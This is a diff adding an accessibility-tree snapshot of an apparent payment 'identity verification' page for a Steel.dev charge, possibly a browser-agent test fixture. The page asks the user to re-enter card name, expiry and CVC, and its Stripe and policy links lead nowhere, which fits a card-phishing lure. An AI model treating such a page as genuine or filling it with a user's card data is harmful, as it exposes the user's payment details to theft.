@@ -1,0 +1,65 @@
+- generic [ref=e2]:
+  - generic [ref=e4]:
+    - generic [ref=e5]:
+      - generic [ref=e6]: ←
+      - img "Steel.dev logo" [ref=e7]
+    - generic [ref=e8]: Identity verification required
+    - generic [ref=e9]:
+      - text: SGD 82.59
+      - generic [ref=e10]:
+        - generic [ref=e11]: "on"
+        - generic [ref=e12]: hold
+    - generic [ref=e13]: To complete your payment, please verify your identity as the authorized cardholder.
+    - generic [ref=e14]:
+      - generic [ref=e15]: Payment details
+      - generic [ref=e16]:
+        - generic [ref=e17]: Merchant
+        - generic [ref=e18]: Steel.dev
+      - generic [ref=e19]:
+        - generic [ref=e20]: Plan
+        - generic [ref=e21]: Developer
+      - generic [ref=e22]:
+        - generic [ref=e23]: Card
+        - generic [ref=e24]:
+          - strong [ref=e25]: VISA
+          - text: •••• 3939
+      - generic [ref=e26]:
+        - generic [ref=e27]: Date
+        - generic [ref=e28]: Apr 2, 2026
+    - generic [ref=e29]:
+      - img [ref=e30]
+      - generic [ref=e32]: This verification is required by your card issuer to prevent unauthorized transactions. Your information is encrypted and secure.
+  - generic [ref=e34]:
+    - heading "Confirm your identity" [level=2] [ref=e35]
+    - paragraph [ref=e36]: Please confirm the details below to verify you are the authorized cardholder and release your payment.
+    - generic [ref=e37]:
+      - generic [ref=e38]: Email address
+      - generic [ref=e40]:
+        - generic [ref=e41]: Email
+        - generic [ref=e42]: contacts.libtia@gmail.com
+    - generic [ref=e43]:
+      - generic [ref=e44]: Cardholder name
+      - textbox "Full name on card" [ref=e45]
+    - generic [ref=e46]:
+      - generic [ref=e47]: Card verification
+      - generic [ref=e48]:
+        - generic [ref=e49]:
+          - generic [ref=e50]: •••• •••• •••• 3939
+          - img [ref=e52]:
+            - generic [ref=e54]: VISA
+        - generic [ref=e55]:
+          - textbox "MM / YY" [ref=e57]
+          - generic [ref=e58]:
+            - textbox "CVC" [ref=e59]
+            - generic [ref=e60]: "123"
+    - button "Verify & complete payment" [ref=e61] [cursor=pointer]
+    - generic [ref=e62]: By verifying, you confirm that you are the authorized holder of the card ending in 3939 and authorize Steel.dev to process the payment of SGD 82.59.
+    - generic [ref=e63]:
+      - link "Powered by stripe" [ref=e64] [cursor=pointer]:
+        - /url: "#"
+        - text: Powered by
+        - strong [ref=e65]: stripe
+      - link "Terms" [ref=e67] [cursor=pointer]:
+        - /url: "#"
+      - link "Privacy" [ref=e68] [cursor=pointer]:
+        - /url: "#"
